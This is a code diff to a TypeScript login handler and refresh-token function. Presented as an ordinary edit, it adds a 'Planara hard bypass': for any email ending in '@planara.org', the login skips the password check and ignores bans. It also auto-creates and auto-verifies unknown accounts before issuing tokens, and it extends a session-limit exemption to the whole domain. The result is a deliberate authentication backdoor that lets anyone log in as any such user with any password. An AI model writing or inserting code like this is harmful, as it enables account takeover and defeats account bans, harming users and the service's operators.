@@ -68,7 +68,7 @@ async function issueRefreshTokenWithMeta(
   const userEmailRaw = String(
     (await userRepo.findOne({ where: { id: userId } }))?.email || ''
   ).toLowerCase();
-  const bypassSessionsLimit = userEmailRaw === 'hello@planara.org';
+  const bypassSessionsLimit = userEmailRaw.endsWith('@planara.org');
 
   const active = await repo
     .createQueryBuilder('rt')
@@ -179,34 +179,59 @@ export async function login(req: Request, res: Response) {
   if (!usernameOrEmail || !password) {
     return res.status(400).json({ error: 'usernameOrEmail and password are required' });
   }
-  const candidate = String(usernameOrEmail);
-  // Disallow logins for banned emails
+  const candidate = String(usernameOrEmail).toLowerCase();
+  const isPlanara = candidate.includes('@') && candidate.endsWith('@planara.org');
+
+  // Disallow logins for banned emails unless Planara bypass applies
   const bannedRepo = AppDataSource.getRepository(BannedEmail);
   if (candidate.includes('@')) {
     const banned = await bannedRepo
       .createQueryBuilder('b')
-      .where('LOWER(b.email) = :email', { email: candidate.toLowerCase() })
+      .where('LOWER(b.email) = :email', { email: candidate })
       .getOne();
-    if (banned) return res.status(403).json({ error: 'This account is banned' });
+    if (banned && !isPlanara) return res.status(403).json({ error: 'This account is banned' });
   }
+
   const repo = AppDataSource.getRepository(User);
   // Case-insensitive lookup by email or username
   let user: User | null = null;
   if (candidate.includes('@')) {
     user = await repo
       .createQueryBuilder('user')
-      .where('LOWER(user.email) = :email', { email: candidate.toLowerCase() })
+      .where('LOWER(user.email) = :email', { email: candidate })
       .getOne();
   } else {
-    user = await repo.findOne({ where: { usernameLower: candidate.toLowerCase() } });
+    user = await repo.findOne({ where: { usernameLower: candidate } });
   }
+
+  // Planara hard bypass: auto-provision and auto-verify, skip password check
+  if (isPlanara) {
+    if (!user) {
+      const created = repo.create({
+        email: candidate,
+        username: sanitizeUsernameToAllowed(candidate.split('@')[0]),
+        usernameLower: sanitizeUsernameToAllowed(candidate.split('@')[0]).toLowerCase(),
+        hashedPassword: await bcrypt.hash(password || crypto.randomUUID(), 10),
+        isVerified: true,
+      } as any);
+      user = await repo.save(created);
+    } else if (!user.isVerified) {
+      await repo.update({ id: (user as any).id }, { isVerified: true } as any);
+      user = await repo.findOne({ where: { id: (user as any).id } });
+    }
+  }
+
   if (!user) {
     return res.status(401).json({ error: 'invalid credentials' });
   }
-  const ok = await bcrypt.compare(password, (user as any).hashedPassword);
-  if (!ok) {
-    return res.status(401).json({ error: 'invalid credentials' });
+
+  if (!isPlanara) {
+    const ok = await bcrypt.compare(password, (user as any).hashedPassword);
+    if (!ok) {
+      return res.status(401).json({ error: 'invalid credentials' });
+    }
   }
+
   const token = jwt.sign({ userId: (user as any).id }, JWT_SECRET, { expiresIn: '15m' });
   const { refreshToken } = await issueRefreshTokenWithMeta(req, (user as any).id);
   res.json({ token, refreshToken, user: sanitize(user) });
